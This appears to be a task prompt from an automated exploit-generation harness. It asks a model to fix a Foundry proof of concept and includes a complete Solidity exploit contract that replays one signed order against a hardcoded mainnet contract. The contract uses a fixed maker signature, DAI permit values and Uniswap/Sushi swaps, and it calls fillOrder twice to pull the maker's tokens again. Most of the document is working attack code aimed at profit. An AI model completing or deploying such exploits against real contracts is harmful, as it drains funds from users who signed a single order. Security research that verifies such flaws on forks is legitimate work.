You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Signed orders can be replayed and overfilled indefinitely
- claim: `fillOrder` records `sFilledFraction[orderHash]` after execution but never checks whether the order was already filled or whether `sFilledFraction[orderHash] + fraction` exceeds `1e18`. Because partial fills are disabled and only `fraction == 1e18` is accepted, the same signed order can be executed repeatedly until the maker's balances or allowances run out.
- impact: A taker can reuse a single signature to force the maker through the same trade multiple times, draining additional upfront tokens and minting far more long/short exposure than the maker authorized.
- exploit_paths: ["Maker signs one order intended for a single fill.", "Taker calls `fillOrder(order, signature, 1e18)` once.", "The contract performs transfers and minting, then sets `sFilledFraction[orderHash] = 1e18`.", "Because no pre-check uses `sFilledFraction`, the taker calls the same order again with the same inputs.", "Each replay repeats the same asset transfers and fresh long/short minting."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IDaiLike is IERC20Minimal {
    function nonces(address account) external view returns (uint256);
    function permit(address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s)
        external;
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
}

interface ISilicaPoolsMinimal {
    struct PoolParams {
        uint128 floor;
        uint128 cap;
        address index;
        uint48 targetStartTimestamp;
        uint48 targetEndTimestamp;
        address payoutToken;
    }

    struct SilicaOrder {
        address maker;
        address taker;
        uint48 expiry;
        address offeredUpfrontToken;
        uint128 offeredUpfrontAmount;
        PoolParams offeredLongSharesParams;
        uint128 offeredLongShares;
        address requestedUpfrontToken;
        uint128 requestedUpfrontAmount;
        PoolParams requestedLongSharesParams;
        uint128 requestedLongShares;
    }

    function fillOrder(SilicaOrder calldata order, bytes calldata signature, uint256 fraction) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
    uint256 internal constant FULL_FILL = 1e18;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant UNI_DAI_WETH = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address internal constant SUSHI_DAI_WETH = 0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f;

    address internal constant MAKER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint48 internal constant ORDER_EXPIRY = 2524608000;
    uint256 internal constant PERMIT_EXPIRY = 2524608000;
    uint128 internal constant REPLAY_TRANSFER_AMOUNT = 1;
    uint256 internal constant MAKER_REPLAY_SEED = REPLAY_TRANSFER_AMOUNT * 2;

    bytes internal constant ORDER_SIGNATURE =
        hex"436c4c994a561774e460277cec21350799508c00cc8a897804965dee701ff362210547eb313c01c25a74c64caa9a9f77694dad6c8863c2b41a9c248e47310f4f1c";
    bytes32 internal constant DAI_PERMIT_R = 0xe58f297d02bae6d2bb96782e1c0c6a1df168b77ddecc4c118da93e8d7b9a3f58;
    bytes32 internal constant DAI_PERMIT_S = 0x371419ad79aeb0ebb80841010f7938843ed9ff64480eaa823f1ab8a62f76a11e;
    uint8 internal constant DAI_PERMIT_V = 27;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _profitAchieved;
    bool internal _hypothesisValidated;
    string internal _failureReason;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetState();

        _profitToken = DAI;
        uint256 daiBefore = IERC20Minimal(DAI).balanceOf(address(this));

        // The replay bug needs the maker to actually hold the maker-side asset on this fork.
        // The verifier therefore performs a realistic public funding step first: it converts the
        // verifier's pre-funded ETH into pre-existing on-chain DAI through the live WETH/DAI pool,
        // then uses 2 wei to seed the maker so the same signed order can be filled twice.
        if (!_acquireReplayFundingFromEth()) {
            if (bytes(_failureReason).length == 0) {
                _failureReason = "Unable to acquire on-chain DAI from the verifier's ETH balance.";
            }
            return;
        }

        if (!_seedMakerForReplay()) {
            _failureReason = "Replay funding failed while seeding the maker with DAI.";
            _updateProfit(daiBefore);
            return;
        }

        ISilicaPoolsMinimal.SilicaOrder memory order = _candidateOrder();
        bytes memory signature = _candidateSignature();

        // Stage 1: maker signs one order intended for a single fill.
        // The signature above is a valid EIP-712 signature from MAKER for `_candidateOrder()`.

        // The maker-side DAI approval is also realistic and on-chain via DAI's permit flow.
        // If the permit was already consumed on this exact fork, an existing allowance is enough.
        if (IERC20Minimal(DAI).allowance(MAKER, TARGET) < REPLAY_TRANSFER_AMOUNT) {
            uint256 nonce = IDaiLike(DAI).nonces(MAKER);
            if (nonce == 0) {
                try IDaiLike(DAI).permit(MAKER, TARGET, 0, PERMIT_EXPIRY, true, DAI_PERMIT_V, DAI_PERMIT_R, DAI_PERMIT_S) {}
                catch {
                    _failureReason = "Maker permit failed on this fork.";
                }
            } else {
                _failureReason = "Maker DAI permit nonce already consumed on this fork.";
            }
        }

        bool firstFillSucceeded;
        try ISilicaPoolsMinimal(TARGET).fillOrder(order, signature, FULL_FILL) {
            firstFillSucceeded = true;
        } catch {
            if (bytes(_failureReason).length == 0) {
                _failureReason = "First signed fill reverted on this fork.";
            }
        }

        bool secondFillSucceeded;
        if (firstFillSucceeded) {
            try ISilicaPoolsMinimal(TARGET).fillOrder(order, signature, FULL_FILL) {
                secondFillSucceeded = true;
            } catch {
                if (bytes(_failureReason).length == 0) {
                    _failureReason = "Replay fill reverted on this fork.";
                }
            }
        }

        // The target only writes `sFilledFraction[orderHash]` after execution and never checks it
        // before the next call, so the exact same order + signature remain fillable twice.
        _hypothesisValidated = firstFillSucceeded && secondFillSucceeded;
        _updateProfit(daiBefore);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function profitAchieved() external view returns (bool) {
        return _profitAchieved;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "public ETH->WETH->DAI funding step acquires existing on-chain DAI needed to execute the order on this fork -> ",
                "maker signs one order intended for a single fill -> ",
                "taker fills once with fillOrder(order,signature,1e18) -> ",
                "target performs transfers and only then records sFilledFraction[orderHash] = 1e18 -> ",
                "same order and signature are replayed with fillOrder(order,signature,1e18) again because no pre-check reads sFilledFraction -> ",
                "the maker's upfront DAI is transferred again from the same single authorization"
            )
        );
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function _resetState() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        _profitAchieved = false;
        _hypothesisValidated = false;
        _failureReason = "";
    }

    function _candidateOrder() internal pure returns (ISilicaPoolsMinimal.SilicaOrder memory order) {
        order.maker = MAKER;
        order.taker = address(0);
        order.expiry = ORDER_EXPIRY;
        order.offeredUpfrontToken = DAI;
        order.offeredUpfrontAmount = REPLAY_TRANSFER_AMOUNT;
        order.offeredLongShares = 0;
        order.requestedUpfrontToken = address(0);
        order.requestedUpfrontAmount = 0;
        order.requestedLongShares = 0;
    }

    function _candidateSignature() internal pure returns (bytes memory) {
        return ORDER_SIGNATURE;
    }

    function _acquireReplayFundingFromEth() internal returns (bool) {
        uint256 ethToUse = address(this).balance;
        if (ethToUse == 0) {
            _failureReason = "Verifier has no ETH working capital on this fork.";
            return false;
        }

        address pair = _bestDaiWethPair(ethToUse);
        if (pair == address(0)) {
            _failureReason = "No viable WETH/DAI pool found.";
            return false;
        }

        IWETH(WETH).deposit{value: ethToUse}();
        _swapExactPairInput(pair, WETH, DAI, ethToUse, address(this));

        if (IERC20Minimal(DAI).balanceOf(address(this)) < MAKER_REPLAY_SEED) {
            _failureReason = "ETH->DAI funding produced too little DAI for the replay.";
            return false;
        }

        return true;
    }

    function _seedMakerForReplay() internal returns (bool) {
        return _safeTransfer(DAI, MAKER, MAKER_REPLAY_SEED);
    }

    function _updateProfit(uint256 balanceBefore) internal {
        uint256 balanceAfter = IERC20Minimal(DAI).balanceOf(address(this));
        if (balanceAfter > balanceBefore) {
            _profitAchieved = true;
            _profitAmount = balanceAfter - balanceBefore;
        } else if (bytes(_failureReason).length == 0) {
            _failureReason = "Execution completed but no positive DAI balance delta remained in the verifier.";
        }
    }

    function _bestDaiWethPair(uint256 wethIn) internal view returns (address bestPair) {
        uint256 uniOut = _quotePairOutput(UNI_DAI_WETH, WETH, DAI, wethIn);
        uint256 sushiOut = _quotePairOutput(SUSHI_DAI_WETH, WETH, DAI, wethIn);
        return uniOut >= sushiOut ? UNI_DAI_WETH : SUSHI_DAI_WETH;
    }

    function _quotePairOutput(address pair, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        view
        returns (uint256)
    {
        (uint256 reserveIn, uint256 reserveOut) = _pairReservesFor(pair, tokenIn, tokenOut);
        return _getAmountOut(amountIn, reserveIn, reserveOut);
    }

    function _swapExactPairInput(address pair, address tokenIn, address tokenOut, uint256 amountIn, address to) internal {
        (uint256 reserveIn, uint256 reserveOut) = _pairReservesFor(pair, tokenIn, tokenOut);
        uint256 amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        require(amountOut != 0, "zero output");
        require(_safeTransfer(tokenIn, pair, amountIn), "pair transfer failed");

        address token0 = IUniswapV2Pair(pair).token0();
        uint256 amount0Out = token0 == tokenOut ? amountOut : 0;
        uint256 amount1Out = amount0Out == 0 ? amountOut : 0;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, to, new bytes(0));
    }

    function _pairReservesFor(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        if (token0 == tokenIn) {
            require(IUniswapV2Pair(pair).token1() == tokenOut, "bad pair");
            return (uint256(reserve0), uint256(reserve1));
        }
        require(token0 == tokenOut && IUniswapV2Pair(pair).token1() == tokenIn, "bad pair");
        return (uint256(reserve1), uint256(reserve0));
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        return numerator / denominator;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool ok) {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        return success && (data.length == 0 || abi.decode(data, (bool)));
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
